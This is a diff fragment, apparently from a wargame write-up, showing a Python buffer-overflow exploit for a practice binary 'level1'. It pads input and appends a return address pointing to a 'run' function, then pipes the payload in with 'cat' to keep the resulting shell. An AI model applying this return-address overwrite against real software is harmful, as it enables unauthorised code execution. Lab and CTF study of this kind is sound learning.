@@ -2,3 +2,5 @@ create this python exploit wich add the address of run function to str wich will
 str = "0123456789012345678901234567890123456789012345678901234567890123456789012345"
 str += "\x44\x84\x04\x08"
 print str
+
+(python PATH_TO_OUR EXPLOIT ; cat) | ./level1
